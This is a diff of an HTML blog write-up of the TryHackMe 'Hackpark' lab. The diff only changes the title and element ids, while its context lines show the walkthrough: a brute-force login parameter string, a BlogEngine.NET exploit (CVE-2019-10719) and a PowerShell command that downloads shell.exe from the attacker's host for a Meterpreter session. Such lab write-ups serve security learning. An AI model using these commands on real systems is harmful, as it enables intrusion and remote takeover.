@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Back Again: THM Hackpark</title>
+<title>THM Hackpark</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
 <link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
@@ -14,7 +14,10 @@
  |
  <a accesskey="H" href="/index.html"> HOME </a>
 </div><div id="content" class="content">
-<h1 class="title">Back Again: THM Hackpark</h1>
+<h1 class="title">THM Hackpark
+<br>
+<span class="subtitle">Back Again</span>
+</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
@@ -85,7 +88,7 @@ available for certain versions of it in exploitdb.
 <p>
 <code>robots.txt</code> has some nice directories:
 </p>
-<pre class="example" id="org848498c">
+<pre class="example" id="org83b3643">
 User-agent: *
 Disallow: /Account/*.*
 Disallow: /search
@@ -99,7 +102,7 @@ Disallow: /archive.aspx
 We have a contact form, so a XSS vulnerability could (maybe) be used
 </p>
 
-<div id="orgcc69b16" class="figure">
+<div id="orga4b366f" class="figure">
 <p><img src="images/Recon/20231215_000936_screenshot.png" alt="20231215_000936_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Contact form</p>
@@ -109,7 +112,7 @@ We have a contact form, so a XSS vulnerability could (maybe) be used
 We also have a log in form:
 </p>
 
-<div id="org75d68cd" class="figure">
+<div id="org276fe84" class="figure">
 <p><img src="images/Recon/20231215_001129_screenshot.png" alt="20231215_001129_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Log in form</p>
@@ -134,7 +137,7 @@ set of parameters (other than just username and password) I need to
 set:
 </p>
 
-<pre class="example" id="org22ca317">
+<pre class="example" id="org5fa88e4">
 __VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
 </pre>
 
@@ -164,7 +167,7 @@ pane).
 </p>
 
 
-<div id="org2cbbd7e" class="figure">
+<div id="orge712f1c" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_003106_screenshot.png" alt="20231215_003106_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Blog Engine Version</p>
@@ -176,7 +179,7 @@ available python scripts for us to use (much better than the manual
 alternative :P ):
 </p>
 
-<pre class="example" id="orgbede0b9">
+<pre class="example" id="orgcc188c2">
 BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Direct | aspx/webapps/47010.py
 BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' D | aspx/webapps/47011.py
 </pre>
@@ -187,7 +190,7 @@ same author and essentially have a similar behavior. I decided to go
 with the first one.
 </p>
 
-<pre class="example" id="org5a26d0c">
+<pre class="example" id="orgb70eaa9">
 Exploit for CVE-2019-10719
 
 CVE Identified by: Aaron Bishop
@@ -221,7 +224,7 @@ nice reverse shell.
 
 
 
-<div id="org1105182" class="figure">
+<div id="orgf0f3f4c" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_004446_screenshot.png" alt="20231215_004446_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Initial Foothold</p>
@@ -278,12 +281,12 @@ in that position make sure that you are smarter than me: pressing
 https instead of http by habit.
 </p>
 
-<pre class="example" id="org1a7b13c">
+<pre class="example" id="org5f32dbe">
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.93.209:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"
 </pre>
 
 
-<div id="org5a33349" class="figure">
+<div id="orgbbea2fa" class="figure">
 <p><img src="images/PrivEsc/20231215_012431_screenshot.png" alt="20231215_012431_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>Meterpreter</p>
